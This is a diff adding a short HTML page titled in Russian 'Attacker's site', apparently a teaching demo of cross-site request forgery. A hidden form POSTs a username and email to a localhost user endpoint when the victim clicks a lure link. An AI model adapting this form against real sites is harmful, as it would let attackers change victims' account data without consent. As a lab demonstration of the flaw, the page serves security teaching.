@@ -1,0 +1,23 @@
+<html lang=en>
+
+<head>
+  <meta charset=utf-8>
+  <title>Сайт злоумышленника</title>
+  <link rel="stylesheet" type="text/css" href="css/normalize.css" />
+</head>
+
+<body>
+  <h1>Сайт злоумышленника</h1>
+
+  <section>
+    <iframe style="display: none;" name="csrf-frame"></iframe>
+    <form method="post" action="http://localhost:3000/user">
+      <input target="csrf-frame" type="hidden" name="username" value="Hacker">
+      <input type="hidden" name="email" value="hacker@mail.com">
+    </form>
+    <a href="#" onclick="document.forms[0].submit()">Посети этот сайт!</a>
+  </section>
+
+</body>
+
+</html>
